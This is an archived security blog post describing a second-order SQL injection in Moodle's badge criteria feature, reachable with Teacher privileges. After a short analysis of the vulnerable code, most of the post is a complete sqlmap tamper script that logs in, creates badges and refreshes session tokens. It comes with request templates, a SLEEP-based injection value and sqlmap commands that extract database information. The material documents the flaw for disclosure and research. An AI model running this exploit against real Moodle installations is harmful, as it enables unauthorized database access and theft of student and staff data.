---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-02_moodle-2nd-order-sqli.md
original_filename: 2022-03-02_moodle-2nd-order-sqli.md
title: Moodle 2nd Order Sqli
category: documents
detected_topics:
- xss
- sqli
- sso
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- xss
- sqli
- sso
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 0554b490d65b8840e8f50b585f27c26a02a9b24a3e7bb6634714cb7d637f0563
text_sha256: 1a024993b68d4a40ebb860c67b7fb1773fddb3bcbd9a187d0082ce35cee05d06
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: true
---

# Moodle 2nd Order Sqli

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-02_moodle-2nd-order-sqli.md
- Source Type: markdown
- Detected Topics: xss, sqli, sso, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: True
- Raw SHA256: `0554b490d65b8840e8f50b585f27c26a02a9b24a3e7bb6634714cb7d637f0563`
- Text SHA256: `1a024993b68d4a40ebb860c67b7fb1773fddb3bcbd9a187d0082ce35cee05d06`


## Content

---
title: "Moodle 2nd Order Sqli"
page_title: "Moodle 2nd Order Sqli – muffSec"
url: "https://muffsec.com/blog/moodle-2nd-order-sqli/"
final_url: "https://muffsec.com/blog/moodle-2nd-order-sqli/"
authors: ["mufinnnnnnn (@mufinnnnnnn)"]
programs: ["Moodle"]
bugs: ["SQL injection"]
publication_date: "2022-03-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2855
---

# [muffSec](https://muffsec.com/blog)

## no sleep security

  * [Home](/)

____ Menu

  * [Home](/)

__ Search

  * [ Posted by dugisec  ](https://muffsec.com/blog/author/dugisec/)
  * [ on March 2, 2022  ](https://muffsec.com/blog/2022/03/02/)

# Moodle 2nd Order Sqli

## Exploitation Summary

Moodle is vulnerable to 2nd order sqli by users with `Teacher` or higher privileges. The reason these privileges are required is because the sqli is in the badge management functionality. When one has the `Teacher` role for a course it is possible to add a badge which students can earn after meeting certain criteria. For example, the badge might be earned after completing the course:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-2-1024x439.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-2.png) [![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-3-1024x503.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-3.png)

After creating the badge, the user is prompted to add the criteria which will qualify students to earn the badge. It is during the creation of badge criteria that one can insert a malicious sql query into the database. Later, that data is fetched from the database and injected unsanitized into another query:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-4-1024x575.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-4.png)

After clicking any of those items on the drop down, the page will land on a URL similar to the following: `http://192.168.1.9/moodle/badges/criteria_settings.php?badgeid=5471&add=1&type=2`. The `type` parameter at the end is the badge type, we need to change it to `6` so that we can create a badge of type `BADGE_CRITERIA_TYPE_PROFILE` and trigger the vulnerable code path:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-5-1024x464.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-5.png) `moodle/badges/criteria/award_criteria.php` [![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-6-1024x504.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-6.png)

If doing this manually, check off the `Surname` box, then capture the request and modify it like so:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-7-1024x437.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-7.png)

On the next page moodle will offer to enable the badge, and that is when the injected sql will be executed:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-8-1024x514.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-8.png)

In the mysql logs we can see the query containing the injected sql:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-9-1024x186.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-9.png)

## Bug Hunting / Analysis

A few months ago I started auditing moodle for…reasons. At a certain point I stumbled on a file in the codebase called `award_criteria_profile.php`. It came up on my radar when doing some greps for variable interpolation happening inside of strings that seemed to be sql code. Stuff that looks like this:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-1-1024x497.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-1.png)`moodle/badges/criteria/award_criteria_profile.php`

As the comments state, this function returns sql code that will essentially grab all the users which meet the badge completion criteria. If `$param['field']` can be controlled then it should be possible to do sql injection. 

To understand how the `$this->params` array is defined we need to look into the superclass of `award_criteria_profile` which is `award_criteria`. In the constructor we can see `$this->params` getting initialized with the `get_params()` function:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-10-1024x284.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-10.png) `moodle/badges/criteria/award_criteria.php` [![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-11-1024x342.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-11.png) `moodle/badges/criteria/award_criteria_profile.php`

It’s going to return the criteria parameters from this table:

[![](https://muffsec.com/blog/wp-content/uploads/2022/03/image-12-1024x163.png)](https://muffsec.com/blog/wp-content/uploads/2022/03/image-12.png)

The exact array it returns will look like this:
  
  
  array(1) {
  ["lastname"]=>
  array(1) {
  ["field"]=>
  string(27) "id = 1 OR (SELECT SLEEP(5))"
  }
  }

So, returning to the first code snippet we can now understand that `$param['field']` is attacker controlled. The last step is to trigger `get_completed_criteria_sql()` to run, which can be done simply by enabling the badge.

## Final Thoughts

In order to exploit this, a new badge has to be created for each sql query that the attacker wants to run. This is because once a badge has been created, the criteria cannot be updated (afaik). 

I have created a sqlmap tamper script which can be used for this purpose. There’s comments, and the code speaks for itself. If you have any tips on how to improve the code I would be glad to hear it. 

I think it’s cool because it’s doing a few things which I haven’t seen in any other tamper script. I also would not be surprised if there are more sqli’s of this nature in moodle.

As a bonus this bug can be used for stored xss as well.

It looks like the vuln was added to the codebase in 2013 with this commit: <https://github.com/moodle/moodle/commit/c8d2f392c5a18892ac69f2e111ba01349c4652e3>. However, I could be wrong since I don’t really know how to use git :->
  
  
  #!/usr/bin/env python
  
  """
  thanks to:
  - https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
  - https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap
  - Miroslav Stampar for maintaining this incredible tool
  
  greetz to:
  - @steventseeley
  - @fabiusartrel
  - @mpeg4codec
  - @0x90shell
  - @jkbenaim
  - jmp
  
  """
  
  import sys
  import requests
  import re
  from pprint import pprint
  from collections import OrderedDict
  from lib.core.enums import PRIORITY
  from lib.core.data import conf
  from lib.core.data import kb
  from random import sample
  __priority__ = PRIORITY.NORMAL
  
  requests.packages.urllib3.disable_warnings()
  
  """
  Moodle 2.7dev (Build: 20131129) to 3.11.5+ 2nd Order SQLi Exploit by muffin (@mufinnnnnnn)
  
  How to use:
  1. Define the variables at the top of the tamper() function, example:
  username  = "teacher's-username"
  password=***REDACTED***s-password"
  app_root  = "http://127.0.0.1/moodle"
  course_id  = 3 
  NOTE: the course_id should be a course that your teacher can create badges on
  
  2. Create a file called `req.txt` that looks like the following. Be sure to update the `Host:` field...
  
  POST /moodle/badges/criteria_settings.php?badgeid=badge-id-replace-me&amp;add=1&amp;type=6 HTTP/1.1
  Host: &lt;your-target-here>
  Content-Type: application/x-www-form-urlencoded
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
  Connection: close
  
  sesskey=sess-key-replace-me&amp;_qf__edit_criteria_form=1&amp;mform_isexpanded_id_first_header=1&amp;mform_isexpanded_id_aggregation=0&amp;mform_isexpanded_id_description_header=0&amp;field_firstname=0&amp;field_lastname=0&amp;field_lastname=*&amp;field_email=0&amp;field_address=0&amp;field_phone1=0&amp;field_phone2=0&amp;field_department=0&amp;field_institution=0&amp;field_description=0&amp;field_picture=0&amp;field_city=0&amp;field_country=0&amp;agg=2&amp;description%5Btext%5D=&amp;description%5Bformat%5D=1&amp;submitbutton=Save
  
  3. Create a file called `req2.txt` that looks like the following. Again, be sure to update the `Host:` field...
  
  POST /moodle/badges/action.php HTTP/1.1
  Host: &lt;your-target-here>
  Content-Type: application/x-www-form-urlencoded
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
  Connection: close
  
  id=badge-id-replace-me&amp;activate=1&amp;sesskey=sess-key-replace-me&amp;confirm=1&amp;return=%2Fbadges%2Fcriteria.php%3Fid%3Dbadge_id-replace-me
  
  4. Run the following sqlmap command, make sure the tamper argument is pointing at this file:
  
  sqlmap -r req.txt --second-req req2.txt --tamper=./moodle-tamper.py --dbms=mysql --level=5 --prefix='id = 1' --drop-set-cookie --answer="login/index.php'. Do you want to follow?=n,Do you want to process it=y" --test-filter='MySQL >= 5.0.12 AND time-based blind (query SLEEP)' --current-user --batch --flush
  
  NOTES:
  - for some reason after the first run sqlmap complains that it cannot fingerprint
  the db and will refuse to try enumerating anthing else, this
  is why there is a flush at the end. I'm sure it can be fixed...
  - you can do error based with this command (if errors are enabled...not likely):
  sqlmap -r req.txt --second-req req2.txt --tamper=./moodle-tamper.py --dbms=mysql --level=5 --prefix='id = 1' --level=5 --drop-set-cookie --answer="login/index.php'. Do you want to follow?=n,Do you want to process it=y" --batch --current-user --fresh-queries --flush --test-filter='MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
  
  
  How it works (briefly):
  - In order to get our sql query into the database it's necessary to create a 
  badge and add some criteria. It is when adding the critera that the 
  sql-to-be-executed-2nd-order is inserted into the database. 
  Finally, when the badge is enabled the injected sql is executed.
  - This tamper script does the following:
  - log in to the app
  - update cookie/sesskey for both the 1st and 2nd requests
  - make all the requests necessary to create the badge, right up until adding the critera
  - sqlmap itself adds the criteria with whatever payload it's testing
  - sqlmap makes the 2nd call to enable the badge (runs the injected sql)
  - next time around the tamper script will delete the badge that it last
  created to prevent have 10000s of badges for the course
  
  
  Analysis of the bug:
  - see https://muffsec.com/blog/moodle-2nd-order-sqli/
  
  
  Why?:
  1. It's an interesting bug, 2nd order sqli is more rare (or maybe just harder to find?)
  2. It's an interesting use of sqlmap. There are some articles talking about using it for 2nd order sqli
  but the use cases outlined are relatively straightforward. There's a few hacky things being done
  with sqlmap in this script which others might want to do some day i.e.
  - using the tamper script to authenticate to the app
  - updating the Cookie in sqlmap's httpHeader structure
  - updating the CSRF token (sesskey) in the body of both the 1st and 2nd request
  3. I wanted to practice programming/thought it would be fun. Also I didn't want to reinvent the 
  wheel with a standalone exploit when sqlmap is just so darn good at what it does.
  
  
  Thoughts:
  - The exploit is not optimized, halfway through writing I realized there is a badge
  duplication feature which would cut the number of requests generated down significantly.
  There's probably many other ways it could be improved as well
  - I didn't do much testing...it works on my system...
  - I would be surprised if anyone ever put a `Teacher` level sqli to practical use
  - As a bonus, this bug is also usable as a stored xss
  - Would be cool if moodle's bug bounty paid more than kudos
  """
  
  def get_user_session(username, password, app_root):
  """
  - logs in to moodle
  - returns session object, cookie, and sesskey
  """
  
  s = requests.Session()
  login_page = "{app_root}/login/index.php".format(app_root=app_root)
  
  # make first GET request to get cookie and logintoken
  r = s.get(login_page, verify=False)
  
  try:
  token = re.findall('logintoken" value="(.*?)"', r.text)[0]
  except Exception as e:
  print("[-] did not find logintoken, is the target correct?")
  print(e)
  sys.exit(1)
  
  payload = {'username': username, 'password': password, 'anchor': '', 'logintoken': token}
  
  # make second request to actually log in
  # also let's us get the sesskey
  r = s.post(login_page, data=payload, allow_redirects=False, verify=False)
  
  # third request for session test which activates the session
  cookie = r.cookies.get_dict()
  r = s.get(r.headers['Location'], verify=False)
  
  sesskey = re.findall('sesskey":"(.*?)"', r.text)[0]
  
  if (len(cookie) == 0):
  sys.exit("[-] Could not establish session! Are credz correct?")
  
  print("[+] Cookie: {} for user \"{}\"".format(cookie, username))
  print("[+] sesskey: {} for user \"{}\"".format(sesskey, username))
  
  return s, cookie, sesskey
  
  def new_badge1(s, sesskey, app_root, course_id):
  """
  - this is the first request that gets generated when "add a new badge"
  is clicked.
  - it returns the `client_id`, `itemid`, and `ctx_id` which are needed on subsequent requests
  - returns -1 on failure
  """
  target_url = "{app_root}/badges/newbadge.php".format(app_root=app_root)
  
  # badge type is 2 which is a course badge (rather than a site badge)
  payload = {'type': 2, 'id': course_id, 'sesskey': sesskey}
  
  r = s.post(target_url, data=payload, allow_redirects=False, verify=False)
  
  try:
  client_id = re.findall('"client_id":"(.*?)"', r.text)[0]
  except Exception as e:
  print("[-] failed to grab client_id in new_badge1()")
  print(e)
  return -1
  
  try:
  itemid = re.findall('"itemid":(.*?),"', r.text)[0]
  except Exception as e:
  print("[-] failed to grab itemid in new_badge1()")
  print(e)
  return -1
  
  try:
  ctx_id = re.findall('&amp;amp;ctx_id=(.*?)&amp;amp;', r.text)[0]
  except Exception as e:
  print("[-] failed to grab ctx_id in new_badge1()")
  print(e)
  return -1
  
  return client_id, itemid, ctx_id
  
  
  def image_signin(s, sesskey, app_root, client_id, itemid, ctx_id):
  """
  - sadly, in order to create a badge we have to associate an image
  - this request adds an image which is a moodle logo from wikimedia
  - returns sourcekey on success
  - return -1 on failure 
  """
  
  target_url = "{app_root}/repository/repository_ajax.php?action=signin".format(app_root=app_root)
  
  # repo id 6 is for when we are downloading an image
  payload = {'file': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c6/Moodle-logo.svg/512px-Moodle-logo.svg.png', 
  'repo_id': '6', 'p': '', 'page': '', 'env': 'filepicker', 'accepted_types[]': '.gif', 'accepted_types[]': '.jpe', 
  'accepted_types[]': '.jpeg', 'accepted_types[]': '.jpg', 'accepted_types[]': '.png', 'sesskey': sesskey, 
  'client_id': client_id, 'itemid': itemid, 'maxbytes': '262144', 'areamaxbytes': '-1', 'ctx_id': ctx_id}
  
  r = s.post(target_url, data=payload, allow_redirects=False, verify=False)
  
  
  try:
  sourcekey = re.findall('"sourcekey":"(.*?)","', r.text)[0]
  except Exception as e:
  print("[-] failed to grab sourcekey in image_signin()")
  print(e)
  return -1
  
  return sourcekey
  
  
  def image_download(s, sesskey, app_root, client_id, itemid, ctx_id, sourcekey):
  """
  - continues the image flow started in image_signin(), here the actual download happens
  - returns image_id on success
  - return -1 on failure 
  """
  
  target_url = "{app_root}/repository/repository_ajax.php?action=download".format(app_root=app_root)
  
  # repo id 6 is for when we are downloading from an image from a URL
  payload = {'repo_id': '6', 'p': '', 'page': '', 'env': 'filepicker', 'accepted_types[]': '.gif', 'accepted_types[]': '.jpe', 
  'accepted_types[]': '.jpeg', 'accepted_types[]': '.jpg', 'accepted_types[]': '.png', 'sesskey': sesskey, 
  'client_id': client_id, 'itemid': itemid, 'maxbytes': '262144', 'areamaxbytes': '-1', 'ctx_id': ctx_id, 
  'title': '512px-Moodle-logo.svg.png', 
  'source': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c6/Moodle-logo.svg/512px-Moodle-logo.svg.png', 
  'savepath': '/', 'sourcekey': sourcekey, 'license': 'unknown', 'author': 'moodle-hax'}
  
  r = s.post(target_url, data=payload, allow_redirects=False, verify=False)
  
  try:
  image_id = re.findall(',"id":(.*?),"file', r.text)[0]
  except Exception as e:
  print("[-] failed to grab image_id in image_download()")
  print(e)
  return -1
  
  return image_id
  
  
  def new_badge2(s, sesskey, app_root, course_id, image_id, name="sqlmap-badge", description="sqlmap-description"):
  """
  - finally we are actually creating the badge
  """
  target_url = "{app_root}/badges/newbadge.php".format(app_root=app_root)
  
  # badge type is 2 which is a course badge (rather than a site badge)
  payload = {'type': '2', 'id': course_id, 'action': 'new', 'sesskey': sesskey, 
  '_qf__core_badges_form_badge': '1', 'mform_isexpanded_id_badgedetails': '1', 
  'mform_isexpanded_id_issuancedetails': '1', 'name': name, 'version': '', 
  'language': 'en', 'description': description, 'image': image_id, 
  'imageauthorname': '', 'imageauthoremail': '', 'imageauthorurl': '', 
  'imagecaption': '', 'expiry': '0', 'submitbutton': 'Create+badge'}
  
  r = s.post(target_url, data=payload, allow_redirects=False, verify=False)
  
  try:
  badge_id = re.findall('badges/criteria.php\?id=(.*?)"', r.text)[0]
  except Exception as e:
  #print("[-] failed to grab badge_id in new_badge2()")
  #print(e)
  return -1
  
  return badge_id
  
  
  def delete_badge(s, sesskey, app_root, course_id, badge_id):
  """
  - delete the badge
  """
  target_url = "{app_root}/badges/index.php".format(app_root=app_root)
  
  # badge type is 2 which is a course badge (rather than a site badge)
  payload =  {'sort': 'name', 'dir': 'ASC', 'page': '0', 'type': '2', 
  'id': course_id, 'delete': badge_id, 'confirm': '1', 'sesskey': sesskey}
  
  # TODO: add validation logic
  r = s.post(target_url, data=payload, allow_redirects=False, verify=False)
  
  
  def tamper(payload, **kwargs):
  
  username  = "teacher"
  password=***REDACTED***
  app_root  = "http://127.0.0.1/moodle"
  course_id = 3 
  
  # check if cookie is set
  # cookie should not be set in the request file or this script will fail
  # https://stackoverflow.com/questions/946860/using-pythons-list-index-method-on-a-list-of-tuples-or-objects
  try:
  cookie_index = [x[0] for x in conf.httpHeaders].index('Cookie')
  except ValueError:
  # if no cookie is found we run the session initialization routine
  s, cookie, sesskey = get_user_session(username, password, app_root)
  
  # this updates the sqlmap cookie
  conf.httpHeaders.append(('Cookie', 'MoodleSession={}'.format(cookie['MoodleSession'])))
  
  # here we're making our own global variable to hold the sesskey and session object
  conf.sesskey = sesskey
  conf.s = s
  
  # check if a badge_id is set, if so delete it before making the new one
  try:
  conf.badge_id is None
  delete_badge(conf.s, conf.sesskey, app_root, course_id, conf.badge_id)
  except AttributeError:
  # we should only hit this on the very first run
  # we hit the AttributeError because conf.badge_id doesn't exist yet
  pass
  
  #
  ## do all the badge creation flow up the point of adding the criteria
  #
  client_id, itemid, ctx_id = new_badge1(conf.s, conf.sesskey, app_root, course_id)
  sourcekey = image_signin(conf.s, conf.sesskey, app_root, client_id, itemid, ctx_id)
  image_id  = image_download(conf.s, conf.sesskey, app_root, client_id, itemid, ctx_id, sourcekey)
  
  # we need to store the badge_id globally
  conf.badge_id = new_badge2(conf.s, conf.sesskey, app_root, course_id, image_id)
  
  
  # - if badge creation failed try deleting the last known badgeid
  # - it's most likely failing because a badge already exists with the same name
  # - yes, it's ugly
  # - if you control+c and there is a badge with some BS criteria you will
  #  only see an error on the badge management page and won't be
  #  able to delete it through moodle
  # - if the trouble badgeid is known it can be deleted to resolve the issue
  if (conf.badge_id == -1):
  with open("/tmp/last-known-badge-id", "r") as f:
  conf.badge_id = f.read()
  delete_badge(conf.s, conf.sesskey, app_root, course_id, conf.badge_id)
  
  conf.badge_id = new_badge2(conf.s, conf.sesskey, app_root, course_id, image_id)
  if (conf.badge_id == -1):
  sys.exit("[-] ya done fucked up...")
  
  with open("/tmp/last-known-badge-id", "w") as f:
  f.write(conf.badge_id)
  
  # - update the sesskey and badge_id in the body of the requests
  # - it seems necessary to update both the conf.parameters and conf.paramDict structures
  post =  ("sesskey={sesskey}&amp;_qf__edit_criteria_form=1&amp;mform_isexpanded_id_first_header=1&amp;"
  "mform_isexpanded_id_aggregation=0&amp;mform_isexpanded_id_description_header=0&amp;field_firstname=0&amp;"
  "field_lastname=0&amp;field_lastname=*&amp;field_email=0&amp;field_address=0&amp;field_phone1=0&amp;field_phone2=0&amp;"
  "field_department=0&amp;field_institution=0&amp;field_description=0&amp;field_picture=0&amp;field_city=0&amp;"
  "field_country=0&amp;agg=2&amp;description[text]=&amp;description[format]=1&amp;submitbutton=Save".format(sesskey=conf.sesskey))
  
  get  = "badgeid={badge_id}&amp;add=1&amp;type=6".format(badge_id=conf.badge_id)
  
  conf.parameters = {'(custom) POST': post,
  'GET': get,
  'Host': conf.parameters['Host'],
  'Referer': conf.parameters['Referer'],
  'User-Agent': conf.parameters['User-Agent']}
  
  conf.paramDict = {'(custom) POST': OrderedDict([('#1*', post)]),
  'GET': OrderedDict([('badgeid', conf.badge_id),
  ('add', '1'),
  ('type', '6')]),
  'Host': {'Host': conf.parameters['Host']},
  'Referer': {'Referer': '{app_root}/badges/criteria_settings.php'.format(app_root=app_root)},
  'User-Agent': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}}
  
  # we need to update values for the second request too
  secondReq_url = ("id={badge_id}&amp;activate=1&amp;sesskey={sesskey}&amp;"
  "confirm=1&amp;return=/badges/criteria.php?id={badge_id}".format(badge_id=conf.badge_id, 
  sesskey=conf.sesskey))
  
  kb['secondReq'] = ('{app_root}/badges/action.php'.format(app_root=app_root), 'POST', 
  secondReq_url, None,
  (('Host', app_root.split('/')[2]),
  ('Content-Type', 'application/x-www-form-urlencoded'),
  ('Cookie', 'MoodleSession={}'.format(conf.s.cookies.get_dict()['MoodleSession'])), # yes, ugly
  ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  ' (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36')))
  
  return payload
  
  

#### Recent Articles

[ File Creation via SQLite Injection ](https://muffsec.com/blog/file-creation-via-sqlite-injection/)

[ Read More » ](https://muffsec.com/blog/file-creation-via-sqlite-injection/)

[ Getting Code Execution on Apache Spark SQL ](https://muffsec.com/blog/getting-code-execution-on-apache-spark-sql/)

[ Read More » ](https://muffsec.com/blog/getting-code-execution-on-apache-spark-sql/)

[ Abstaining From Pwn2own ](https://muffsec.com/blog/abstaining-from-pwn2own/)

[ Read More » ](https://muffsec.com/blog/abstaining-from-pwn2own/)

[ Linux Kernel Compile/Debug Instructions ](https://muffsec.com/blog/linux-kernel-compile-debug-instructions/)

[ Read More » ](https://muffsec.com/blog/linux-kernel-compile-debug-instructions/)

[ How to Use EfiGuard to Disable PatchGuard ](https://muffsec.com/blog/how-to-use-efiguard-to-disable-patchguard/)

[ Read More » ](https://muffsec.com/blog/how-to-use-efiguard-to-disable-patchguard/)

#### Archives

##### Archives

  * [October 2025](https://muffsec.com/blog/2025/10/) (1)
  * [August 2025](https://muffsec.com/blog/2025/08/) (1)
  * [December 2024](https://muffsec.com/blog/2024/12/) (1)
  * [March 2023](https://muffsec.com/blog/2023/03/) (1)
  * [May 2022](https://muffsec.com/blog/2022/05/) (3)
  * [March 2022](https://muffsec.com/blog/2022/03/) (1)
  * [January 2022](https://muffsec.com/blog/2022/01/) (1)
  * [August 2020](https://muffsec.com/blog/2020/08/) (1)
  * [November 2019](https://muffsec.com/blog/2019/11/) (1)
  * [July 2019](https://muffsec.com/blog/2019/07/) (1)
  * [June 2019](https://muffsec.com/blog/2019/06/) (1)
  * [May 2019](https://muffsec.com/blog/2019/05/) (2)
  * [March 2019](https://muffsec.com/blog/2019/03/) (1)
  * [November 2018](https://muffsec.com/blog/2018/11/) (1)
  * [May 2018](https://muffsec.com/blog/2018/05/) (3)
  * [November 2015](https://muffsec.com/blog/2015/11/) (1)
  * [March 2015](https://muffsec.com/blog/2015/03/) (3)
  * [February 2015](https://muffsec.com/blog/2015/02/) (5)
  * [January 2015](https://muffsec.com/blog/2015/01/) (20)
